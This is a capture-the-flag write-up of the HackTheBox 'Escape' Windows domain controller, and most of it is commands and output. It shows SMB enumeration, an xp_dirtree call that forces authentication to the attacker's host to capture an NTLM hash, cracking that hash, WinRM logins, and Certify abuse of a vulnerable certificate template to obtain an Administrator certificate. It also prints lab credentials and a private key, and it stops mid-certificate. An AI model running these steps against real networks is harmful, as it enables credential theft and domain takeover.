---
layout: post
title: Escape - Medium - Windows
date: 25-02-2023
categories: [CTF - HackTheBox]
tag: [SMB, Certificate Authority, Certify, MSSQL, NTLM, Responder, Rubeus]
---

Windows domain controller with no web services. Starts with enumerating a public SMB share and eventually leads to exploiting a certificate authority to gain administrator access.

# Nmap Scan
Appears to be a Windows domain controller with no web services.

```
# Nmap 7.92 scan initiated Sat Feb 25 20:02:55 2023 as: nmap -sC -sV -p- -oA nmap/escape-allports -v 10.129.162.142
Nmap scan report for 10.129.162.142
Host is up (0.028s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-26 04:04:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-26T04:06:01+00:00; +7h59m43s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
|_SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
|_SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
|_ssl-date: 2023-02-26T04:06:01+00:00; +7h59m43s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: sequel
|   NetBIOS_Domain_Name: sequel
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sequel.htb
|   DNS_Computer_Name: dc.sequel.htb
|   DNS_Tree_Name: sequel.htb
|_  Product_Version: 10.0.17763
|_ssl-date: 2023-02-26T04:06:01+00:00; +7h59m43s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-02-23T20:13:30
| Not valid after:  2053-02-23T20:13:30
| MD5:   eccb 2409 86ca 2f54 e4c2 cecd a3a0 e7b7
|_SHA-1: 7629 6353 a654 d4a3 0155 0a22 e33d 86bb ae96 d4f7
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-26T04:06:01+00:00; +7h59m43s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
|_SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
|_SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
|_ssl-date: 2023-02-26T04:06:01+00:00; +7h59m43s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
64925/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m42s, deviation: 0s, median: 7h59m42s
| smb2-time: 
|   date: 2023-02-26T04:05:20
|_  start_date: N/A
| ms-sql-info: 
|   10.129.162.142:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 25 20:06:18 2023 -- 1 IP address (1 host up) scanned in 203.15 seconds
```
# SMB Shares - null auth
It was possible to access public shares via SMB with null authentication. 

```
┌─[parrot@parrotos]─[~/htb/escape]
└──╼ $crackmapexec smb 10.129.228.253 -u 'smbtest' -p '' --shares
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\smbtest: 
SMB         10.129.228.253  445    DC               [+] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share 
```
# SMB Public folder
The public folder contains a SQL procedures document. Nothing else of interest on the SMB share.

```
┌─[✗]─[parrot@parrotos]─[~/htb/escape]
└──╼ $smbclient //10.129.228.253/Public
Enter WORKGROUP\parrot's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 11:51:25 2022
  ..                                  D        0  Sat Nov 19 11:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022

		5184255 blocks of size 4096. 1444179 blocks available
smb: \> 
```
# Inspecting PDF document
The document appears to be an introduction for new staff members. It contains some credentials for the SQL service. 

```
Bonus
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```
# Testing credentials with WINRM and SMB
The credentials did not work with SMB or WINRM. Nothing of value yet.

```
┌─[parrot@parrotos]─[~/htb/escape]
└──╼ $crackmapexec winrm 10.129.228.253 -u PublicUser -p GuestUserCantWrite1 
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.129.228.253  5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.129.228.253  5985   DC               [*] http://10.129.228.253:5985/wsman
WINRM       10.129.228.253  5985   DC               [-] sequel.htb\PublicUser:GuestUserCantWrite1
┌─[parrot@parrotos]─[~/htb/escape]
└──╼ $crackmapexec smb 10.129.228.253 -u PublicUser -p GuestUserCantWrite1 --shares
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [-] sequel.htb\PublicUser:GuestUserCantWrite1 STATUS_ACCESS_DENIED 
SMB         10.129.228.253  445    DC               [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```
# Testing credentials with MSSQL
Since the credentials were related to SQL it made sense to test them with the intended purpose in mind. It was possible to authenticate and connect to the MSSQL service.

```
┌─[✗]─[parrot@parrotos]─[/opt/impacket/impacket]
└──╼ $mssqlclient.py PublicUser:GuestUserCantWrite1@sequel.htb
Impacket v0.10.1.dev1+20230712.145931.275f4b97 - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> 
```
# Attempting to execute shell commands via MSSQL
Unfortunately it was not possible to execute commands or unlock the ability to do so with this user. 

```
SQL (PublicUser  guest@master)> xp_cmdshell whoami
[-] ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (PublicUser  guest@master)> enable_xp_cmdshell
[-] ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (PublicUser  guest@master)> 
```
# Stealing the NTLM hash
After trying to access my own SMB share with the xp_dirtree command it was possible to intercept the NTLM hash using responder.

```
SQL (PublicUser  guest@master)> xp_dirtree //10.10.14.96/share/test
subdirectory   depth   file   
------------   -----   ----   
SQL (PublicUser  guest@master)> 
```
```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:a0fb2fd402013d12:0******0
```
# Cracking NTLM hash
Cracking the hash with John the Ripper was possible and unlocked a set of credentials.

```
┌─[✗]─[parrot@parrotos]─[~/htb/escape]
└──╼ $john ntlmhash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
R*********e (sql_svc)
1g 0:00:00:03 DONE (2023-07-14 22:35) 0.2590g/s 2772Kp/s 2772Kc/s 2772KC/s RENZOJAVIER..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
# Testing credentials
It looks like the credentials work with WINRM. Nothing new on SMB shares.

```
┌─[parrot@parrotos]─[~/htb/escape]
└──╼ $cme winrm 10.129.228.253 -u 'sql_svc' -p 'R*********e' 
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.129.228.253  5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.129.228.253  5985   DC               [*] http://10.129.228.253:5985/wsman
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\sql_svc:R*********e (Pwn3d!)
```
# Logging in via WINRM as sql_svc
```
┌─[parrot@parrotos]─[~/htb/escape]
└──╼ $evil-winrm -i 10.129.228.253 -u 'sql_svc' -p 'R*********e'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```
# Certify - testing as sql_svc user
There seems to be a certificate authority on the domain controller as the certificate naming scheme hints at it. Certify was used to check for any vulnerable certificates and none were found.

```
*Evil-WinRM* PS C:\programdata> upload Certify.exe
Info: Uploading Certify.exe to C:\programdata\Certify.exe

                                                             
Data: 236884 bytes of 236884 bytes copied

Info: Upload successful!
```
```
*Evil-WinRM* PS C:\programdata> .\certify.exe find /vulnerable 

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!



Certify completed in 00:00:10.8880243
```
# Exploring file system
Exploring the file system lead to finding a username and password in an error log produced by MSSQL. The password was typed as the username so it must have been inadvertently logged. 

```
*Evil-WinRM* PS C:\programdata> cd c:\
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows
```
```
*Evil-WinRM* PS C:\> cd SQLServer
*Evil-WinRM* PS C:\SQLServer> ls


    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
```
```
*Evil-WinRM* PS C:\SQLServer> cd logs
*Evil-WinRM* PS C:\SQLServer\logs> ls


    Directory: C:\SQLServer\logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
```
```
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosq***'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```
# Testing credentials - Ryan.Cooper
These new credentials are valid and allow WINRM access.

```
┌─[parrot@parrotos]─[~/htb/escape]
└──╼ $cme winrm 10.129.228.253 -u 'ryan.cooper' -p 'NuclearMosq***'
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.129.228.253  5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.129.228.253  5985   DC               [*] http://10.129.228.253:5985/wsman
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)
```
```
┌─[✗]─[parrot@parrotos]─[~/htb/escape]
└──╼ $evil-winrm -i 10.129.228.253 -u 'ryan.cooper' -p 'NuclearMosq***'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

User flag captured.

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> ls


    Directory: C:\Users\Ryan.Cooper\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/14/2023  10:05 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
ad8fea354fee7aa6ac550d0c994a7246
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> 
```
# Certify check with new user - Ryan.Cooper
Next logical step is to repeat the certify check with the new user. After running the check it found a vulnerable certificate. 

```
*Evil-WinRM* PS C:\programdata> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.1796054
```
# Escalating to Administrator
The plan now is to generate a certificate which can be used by Rubeus to expose the administrator NTLM hash.

```
*Evil-WinRM* PS C:\programdata> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Brandon.Brown            Guest
James.Roberts            krbtgt                   Nicole.Thompson
Ryan.Cooper              sql_svc                  Tom.Henn
The command completed with one or more errors.
```
```
*Evil-WinRM* PS C:\programdata> .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp0NDlZKGeEtJecK2XJP9u68p874vzSZXMCMjOXKWw7bKlb1g
LUfS3J6iJ7CiF1boRrkGJfM6hnOtlqlOj1h1B7Kq64e1hQB8O9S2TrgSQXo7ryAv
8XIbFc9GO1ja+poD/0KrpBiWJCtyZiO38VLO0H3t+d+6BrCC5lHS7qrc+WPR17Ot
Q7tK3oGeybDIU3rE7TSMsD9cLYC/ByTaP29i90VY1dasO4CiwWhdLEVbQUJAOm/4
yja42A/PS5JZIOE/zzvue5gwYAH04jifjhDRbdynqt+LoMF5L02mA1Q3TNZ8gmEs
Gqe/t2B6nlbowBfc9I62iiPpnzttW7qXA58b3QIDAQABAoIBAHA3l6NFAAS69hvD
v9eSznvaBDpskeOAYqSAHoTPVUkPXRFjUaBvfI/Zug8I2WbxPrscLXzOl6hW+dKH
2pYfkbzNaRDGJsmJzs/RYVKk+lKFsH9JCAFkPbm/K25rqdbR9/aNA1z/xdOUdpcC
RcmZdfm5Uyz+pe8RA3GE2hCX/9MsyBkCIcNIEZEdvdGyzUfu6CJYRLHoz5+VTxmp
oijBzVsZhmjOc7ph6P2kz1mfE4MFW7MHD+3t3A5CourOyi+WIrf9MkrlMapZEhvq
UitUnrMWebdiKCjvaDcajyRKF8FT6d7Z9nbt7+7xRNZYlG4OfSxkccnH4asC3k01
b7cePF0CgYEA25J3av+K7b1ZSET7pS2ZezWjnse5KBHpRt85wT61jnMQCHKvloiB
Mrfs3e9RKIsG5lX0Gu1+38tGpPbyVXGSYPVKiVnwbXe6vBndqLQsbp4Lgmlq/muT
5Q/c/gX9iS6FWOXblJL7awvDkT7WludcO+1G+ak02TvHy/9pB10sX+t53JoVqIpD
QmXIwIwS7BPfhnzerxlEAPSGrGZvgV3sRX2WH6cCgYBGezyEByVkbQx0y1fvzLRg
vXYZKMlBmIZGLq+OXX/QCxVRcOb2LjlgTOYXoZlt74SGPaPcfzikAMSualT5EYmK
1kErw0cdzaz9wnina9TmWhr8TtjnguUmLlJRK6Ke/fXq0JrGcIg52TuMSuEjXGff
dQMWMEUDYXOkkG8v8OlSUwKBgQCaGQMs58/hs/lyyyFho+wn1yHZoByrwIPP5tXf
jhUfIhXtup2xg9L3O6CcrIC1xa2Ja+LLL9TWWk91NnCixcfUyKypcvtP69LQHfRx
Wlcqc33SZv3DgokxC3xEM6PxIUUaEF+DuUCAfm95Y17PPB8PSCzHgHJnCu7z0A8i
/lFBowKBgHROsK7+a3ZxAorp/3KL3PkdFXLxA9Nh2pLW53gZ5rasxqaYbDVqPhmU
+AzgkUmUfuvCaIcLEuIQHGT8USIK9U/OwovdSOehAiSAwytnLH3hw9nNK4YMcm9r
zvkBshf2bN4DN0kPfWEf7kbg3T8ZpNDzmGoW2EBzKl4pVbHXowHB
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAr7zKKxlyQRDgAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNzE1MDU0NzA3WhcNMjUwNzE1
MDU1NzA3WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCnQ0OVkoZ4S0l5wrZck/27rynz
vi/NJlcwIyM5cpbDtsqVvWAtR9LcnqInsKIXVuhGuQYl8zqGc62WqU6PWHUHsqrr
h7WFAHw71LZOuBJBejuvIC/xchsVz0Y7WNr6mgP/QqukGJYkK3JmI7fxUs7Qfe35
37oGsILmUdLuqtz5Y9HXs61Du0regZ7JsMhTesTtNIywP1wtgL8HJNo/b2L3RVjV
1qw7gKLBaF0sRVtBQkA6b/jKNrjYD89Lklkg4T/PO+57mDBgAfTiOJ+OENFt3Keq
34ugwXkvTaYDVDdM1nyCYSwap7+3YHqeVujAF9z0jraKI+mfO21bupcDnxvdAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAO2M+0veM4HuTInTiOV1AKfiRuLcmMgSIksOJwjVh0ZiQoX+QNbmXUQK/
ZKVSOep0Jnc9E9Jg5ZkPLdZYl/VucpwSV2q85SWC3wCoPj/6weyubB/oGtMRJVmX
U6+ljcTX+GqF9tBO86cH8Q90iXiIJ2CMDhjKcpE0UFLV8oouXikEeMFccmAFIvBB
yP2mai+gCvNWu5rI+iqR9P87tEP4Epy2o/C0n7aluV/OtUGGsXOtUpbU2oTcXGs3
